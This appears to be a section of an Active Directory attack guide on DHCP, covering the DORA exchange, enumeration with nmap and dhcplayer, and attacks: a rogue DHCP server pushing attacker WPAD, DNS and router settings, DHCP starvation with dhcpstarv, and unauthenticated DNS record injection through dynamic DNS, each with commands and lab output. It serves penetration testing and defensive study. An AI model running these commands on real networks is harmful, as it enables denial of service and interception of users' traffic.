# DHCP

Link: [https://zer1t0.gitlab.io/posts/attacking\_ad/#dhcp](https://zer1t0.gitlab.io/posts/attacking\_ad/#dhcp)

DHCP (Dynamic Host Configuration Protocol) is a protocol that helps to configure dynamic IP addresses for the computers of a network. It is an application protocol that works over UDP. It uses the port 67/UDP in the server and requires the client to send the messages from the port 68/UDP.

```
client                         server
 -----.                        .-----
      |                        |
     ---.      .------.      .---
 68/UDP |>---->| DHCP |>---->| 67/UDP
     ---'      '------'      '---
      |                        |
 -----'                        '-----
```



In DHCP, the new clients of the network search for the DHCP server to get a correct configuration that allows them to interact with the rest of the network. This process of configuration is divided in four phases:

1. **Server discovery**: The client asks for a IP address by sending a broadcast message, to the 255.255.255.255 address or the network broadcast address, in order to reach the DHCP server.
2. **IP lease offer**: The server answers (also to broadcast) with an IP address that offers to the client, as well as other configuration options.
3. **IP lease request**: The client receives the offered IP and sends a message to request it.
4. **IP lease acknowledge**: The server confirms that the client can use the choosen IP address. Also, it includes several configuration options like the IP renewal time.

This phases are usually abreviated as DORA (Discovery, Offer, Request, Acknowledge) and are triggered when a computer joins to a network. DHCP configuration can also be triggered manually with the `dhclient` command in Linux and `ipconfig /renew` in Windows.

```
  client        server
    |             |
    |  discovery  |
    | ----------> |
    |             |
    |    offer    |
    | <---------- |
    |             |
    |   request   |
    | ----------> |
    |             |
    | acknowledge |
    | <---------- |
    |             |
```

You can check the options provided by the DHCP server with [dhcplayer](https://github.com/Zer1t0/dhcplayer#dhcp-server) or the nmap script [broadcast-dhcp-discover](https://nmap.org/nsedoc/scripts/broadcast-dhcp-discover.html). However, root/admin privileges are required since source port 68 needs to be used.

```
root@debian10:~# nmap --script broadcast-dhcp-discover -e enp7s0
Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-30 05:55 EST
Pre-scan script results:
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     IP Offered: 192.168.100.7
|     DHCP Message Type: DHCPOFFER
|     Subnet Mask: 255.255.255.0
|     Renewal Time Value: 4d00h00m00s
|     Rebinding Time Value: 7d00h00m00s
|     IP Address Lease Time: 8d00h00m00s
|     Server Identifier: 192.168.100.2
|     WPAD: http://isalocal.contoso.local:80/wpad.dat\x00
|     Router: 192.168.100.2
|     Name Server: 192.168.100.2
|     Domain Name Server: 192.168.100.2
|     Domain Name: contoso.local\x00
|_    NetBIOS Name Server: 192.168.100.2
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.52 seconds
```

Apart from enumeration, the DHCP protocol can also be abused to perform a couple of attacks:

* DHCP starvation/exhaustion
* Rogue DHCP server

Let's see how they work.

## Rogue DHCP server

Any machine in the network can take the role of a DHCP server by answering to the client discovery/request messages. Therefore, an attacker could create a rogue DHCP server in order to set a custom configuration in the clients.

Between the options that are configured by a DHCP server are the following:

* Gateway/router
* DNS servers
* NetBIOS/WINS name servers
* WPAD

In this way, clients could be, among others things, misconfigured to send DNS request to a rogue DNS server, that could redirect them to fake computers or domains controlled by the attacker. In order to perform this kind of attack, it is possible to use tools like [yersinia](https://github.com/tomac/yersinia) or [dhcplayer](https://github.com/Zer1t0/dhcplayer#dhcp-server).

```
$ dhcplayer server -I eth2 --wpad http://here.contoso.local/wpad.dat -v --domain contoso.local          
INFO - IP pool: 192.168.100.1-192.168.100.254
INFO - Mask: 255.255.255.0
INFO - Broadcast: 192.168.100.255
INFO - DHCP: 192.168.100.44
INFO - DNS: [192.168.100.44]
INFO - Router: [192.168.100.44]
INFO - WPAD: http://here.contoso.local/wpad.dat
INFO - Domain: contoso.local
INFO - REQUEST from 52:54:00:5d:56:b9 (debian10)
INFO - Requested IP 192.168.100.145
INFO - ACK to 192.168.100.145 for 52:54:00:5d:56:b9
INFO - REQUEST from 52:54:00:76:87:bb (ws01-10)
INFO - Requested IP 192.168.100.160
INFO - ACK to 192.168.100.160 for 52:54:00:76:87:bb
```

## DHCP Starvation

The DHCP starvation attack is a DOS attacks where a fake client requests all available IP addresses that a DHCP server offers. This way, the legitimate clients cannot obtain an IP address so must stay offline. It is possible to perform this attack by using tools like [dhcpstarv](https://github.com/sgeto/dhcpstarv), [yersinia](https://github.com/tomac/yersinia) or [dhcplayer](https://github.com/Zer1t0/dhcplayer#starvation-attack).

```bash
$ dhcpstarv -i enp7s0
08:03:09 11/30/20: got address 192.168.100.7 for 00:16:36:99:be:21 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.8 for 00:16:36:25:1f:1d from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.9 for 00:16:36:c7:79:f2 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.10 for 00:16:36:f4:c3:e9 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.11 for 00:16:36:dc:51:a1 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.12 for 00:16:36:c2:c2:06 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.13 for 00:16:36:15:e0:74 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.14 for 00:16:36:40:1c:02 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.15 for 00:16:36:c5:9a:c3 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.16 for 00:16:36:14:1a:b3 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.17 for 00:16:36:13:45:14 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.18 for 00:16:36:14:fb:18 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.19 for 00:16:36:b2:93:90 from 192.168.100.2
08:03:09 11/30/20: got address 192.168.100.20 for 00:16:36:c7:38:f9 from 192.168.100.2
```

## DHCP Discovery

Also DHCP can be interesting from the client point of view, since it could allow you to get some useful information about the environment, that what it is designed for.

You can sent a DISCOVER to message to the network and check what information is retrieved. Is a way to get information from an unauthenticated position, like the domain or the servers addresses, which usually are the Domain Controllers.

```
$ dhcplayer discover -I eth2 -n

OFFER received from 192.168.100.2
Offered IP: 192.168.100.3
Client MAC: 52:54:00:88:80:0c
DHCP Server: 192.168.100.2
Options:
[1] Subnet Mask: 255.255.255.0
[58] Renewal Time: 345600
[59] Rebinding Time: 604800
[51] IP Address Lease Time: 691200
[54] DHCP Server ID: 192.168.100.2
[3] Router: 192.168.100.2
[5] Name Server: 192.168.100.2
[6] Domain Server: 192.168.100.2
[15] Domain Name: contoso.local
[44] NetBIOS Name Server: 192.168.100.2
[77] Unknow: [0, 14, 82, 82, 65, 83, 46, 77, 105, 99, 114, 111, 115, 111, 102, 116, 0, 0, 0, 80, 0, 68, 0, 101, 0, 102, 0, 97, 0, 117, 0, 108, 0, 116, 0, 32, 0, 82, 0, 111, 0, 117, 0, 116, 0, 105, 0, 110, 0, 103, 0, 32, 0, 97, 0, 110, 0, 100, 0, 32, 0, 82, 0, 101, 0, 109, 0, 111, 0, 116, 0, 101, 0, 32, 0, 65, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 32, 0, 67, 0, 108, 0, 97, 0, 115, 0, 115, 0, 0, 0, 74, 0, 85, 0, 115, 0, 101, 0, 114, 0, 32, 0, 99, 0, 108, 0, 97, 0, 115, 0, 115, 0, 32, 0, 102, 0, 111, 0, 114, 0, 32, 0, 114, 0, 101, 0, 109, 0, 111, 0, 116, 0, 101, 0, 32, 0, 97, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 32, 0, 99, 0, 108, 0, 105, 0, 101, 0, 110, 0, 116, 0, 115, 0, 0]
[77] Unknow: [0, 15, 66, 79, 79, 84, 80, 46, 77, 105, 99, 114, 111, 115, 111, 102, 116, 0, 0, 40, 0, 68, 0, 101, 0, 102, 0, 97, 0, 117, 0, 108, 0, 116, 0, 32, 0, 66, 0, 79, 0, 79, 0, 84, 0, 80, 0, 32, 0, 67, 0, 108, 0, 97, 0, 115, 0, 115, 0, 0, 0, 58, 0, 85, 0, 115, 0, 101, 0, 114, 0, 32, 0, 99, 0, 108, 0, 97, 0, 115, 0, 115, 0, 32, 0, 102, 0, 111, 0, 114, 0, 32, 0, 66, 0, 79, 0, 79, 0, 84, 0, 80, 0, 32, 0, 67, 0, 108, 0, 105, 0, 101, 0, 110, 0, 116, 0, 115, 0, 0]
[252] WPAD: http://isalocal.contoso.local:80/wpad.dat
```

## DHCP Dynamic DNS

In Active Directory you can ask (by default) to the DHCP server to [create custom DNS A records](https://www.trustedsec.com/blog/injecting-rogue-dns-records-using-dhcp/) based on the client hostname, that is indicated in the DHCP request. This can be very useful since you don't need any kind of authentication/authorization for performing this operation.

```powershell
PS C:\> Get-DhcpServerv4DnsSetting

DynamicUpdates             : OnClientRequest
DeleteDnsRROnLeaseExpiry   : True
UpdateDnsRRForOlderClients : False
DnsSuffix                  :
DisableDnsPtrRRUpdate      : False
NameProtection             : False
```

A client can request a DNS update of DNS A record, it needs to include the [Client FQDN (Fully Qualified Domain Name) option](https://datatracker.ietf.org/doc/html/rfc4702) in the DHCP request with the "S" [flag](https://datatracker.ietf.org/doc/html/rfc4702#section-2.1) set to 1, along with the FQDN or hostname set. The server will return the same flag set to 1 if the update was done. The new A record will point the client hostname to the acquired IP address. You can request a DNS update by using [dhcplayer](https://github.com/Zer1t0/dhcplayer#dns-dynamic-update) with the `--dns-update` flag.

```
$ dhcplayer discover -I eth2 --dns-update -H hira
ACK received from 0.0.0.0
Acquired IP: 192.168.100.121
Client MAC: 52:54:00:88:80:0c
Options:
[58] Renewal Time: 345600
[59] Rebinding Time: 604800
[51] IP Address Lease Time: 691200
[54] DHCP Server ID: 192.168.100.240
[1] Subnet Mask: 255.255.255.0
[81] Client FQDN: flags: 0x1 (server-update) A-result: 255 PTR-result: 0 
[3] Router: 192.168.100.240
[15] Domain Name: poke.mon
[6] Domain Server: 192.168.100.240,192.168.100.240,192.168.100.2
                                                                                                                
$ nslookup hira.poke.mon 192.168.100.240                                                               
Server:		192.168.100.240
Address:	192.168.100.240#53

Name:	hira.poke.mon
Address: 192.168.100.121
```

Since the DHCP will usually assign the same address to the same client (based on the client MAC), you can change the DNS record with multiple requests with different hostnames. Also, if no hostname is given, the DNS record will be deleted. It also will the delete when the DHCP lease expires.

However, there are certain [DNS names that are protected](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/) by the DNS Global Query Block List (GQBL) from being resolved even if you add a DNS record. By default those are `wpad` and `isatap`.

```powershell
PS C:\> Get-DnsServerGlobalQueryBlockList


Enable : True
List   : {wpad, isatap}
```
